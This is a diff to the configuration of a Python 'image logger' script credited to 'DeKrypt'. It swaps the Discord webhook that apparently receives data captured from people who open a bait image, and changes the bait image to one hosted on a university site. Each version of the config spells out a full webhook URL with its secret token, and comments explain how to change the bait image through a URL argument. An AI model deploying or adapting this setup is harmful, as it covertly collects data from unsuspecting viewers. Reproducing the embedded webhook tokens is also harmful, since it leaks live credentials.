@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1396836331157717042/Sd07ELCFx-Z1Fa6_ORzlUDCUJTt1QS9ge8O_m9H5FO6pUbBMEyLbiGmxKgXQbLW5SLKp",
-    "image": "https://www.google.com.br/imgres?q=imagem&imgurl=https%3A%2F%2Fdesigndobom.com.br%2Fwp-content%2Fuploads%2F2018%2F09%2Fimagem_para_sexta_51-620x653.jpg&imgrefurl=https%3A%2F%2Fdesigndobom.com.br%2Fcategory%2Fimagem-para-sexta%2F&docid=tZUdxJunmECqtM&tbnid=bLlL5lDkvgHIuM&vet=12ahUKEwjQ8qvG_c2OAxXapZUCHXwwKBoQM3oECA0QAA..i&w=620&h=653&hcb=2&ved=2ahUKEwjQ8qvG_c2OAxXapZUCHXwwKBoQM3oECA0QAA", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1396947107361067079/eRzEu8ylhYsuLEYW9W7NVmiU_AA57f0-XBhtHqdB4GFdBIiPW_-1yTpDbEHfllQq8R6y",
+    "image": "https://ufsb.edu.br/pibid/images/phocagallery/galeria2/thumbs/phoca_thumb_l_image03_grd.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
